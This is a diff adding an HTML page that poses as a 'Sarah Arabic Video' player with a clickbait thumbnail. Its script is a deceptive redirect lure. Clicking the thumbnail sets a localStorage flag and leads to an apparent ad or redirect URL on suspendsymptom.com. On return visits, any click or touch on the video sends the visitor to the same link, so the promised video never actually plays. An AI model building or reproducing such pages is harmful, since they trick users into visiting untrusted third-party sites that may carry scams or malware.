@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <title>Sarah Arabic Video</title>
+  <style>
+    body {
+      font-family: Arial;
+      padding: 20px;
+      text-align: center;
+      background-color: #f2f2f2;
+    }
+    .thumbnail {
+      max-width: 100%;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+    video {
+      width: 100%;
+      max-width: 600px;
+      display: none;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Sarah Arabic Video</h1>
+
+  <img src="https://i.ibb.co/1GQmrxCb/FB-IMG-17448627090875883.jpg" class="thumbnail" id="thumb" alt="Thumbnail">
+
+  <video id="video" controls>
+    <source src="https://drive.google.com/uc?export=download&id=1Ch06KU2NYplVocFwD9fhHdfGa1Zsi_h0" type="video/mp4">
+    আপনার ব্রাউজার ভিডিও প্লে করতে পারে না।
+  </video>
+
+  <script>
+    const thumb = document.getElementById('thumb');
+    const video = document.getElementById('video');
+    const redirectLink = "https://suspendsymptom.com/r2ebuf1s?key=706b12458ce632f0e04f9f496ba1a1b9";
+
+    if (localStorage.getItem('visited') === 'true') {
+      thumb.style.display = 'none';
+      video.style.display = 'block';
+      video.play();
+
+      video.addEventListener('click', () => {
+        window.location.href = redirectLink;
+      });
+
+      video.addEventListener('touchstart', () => {
+        window.location.href = redirectLink;
+      });
+    }
+
+    thumb.onclick = function() {
+      localStorage.setItem('visited', 'true');
+      window.location.href = redirectLink;
+    }
+  </script>
+
+</body>
+</html>
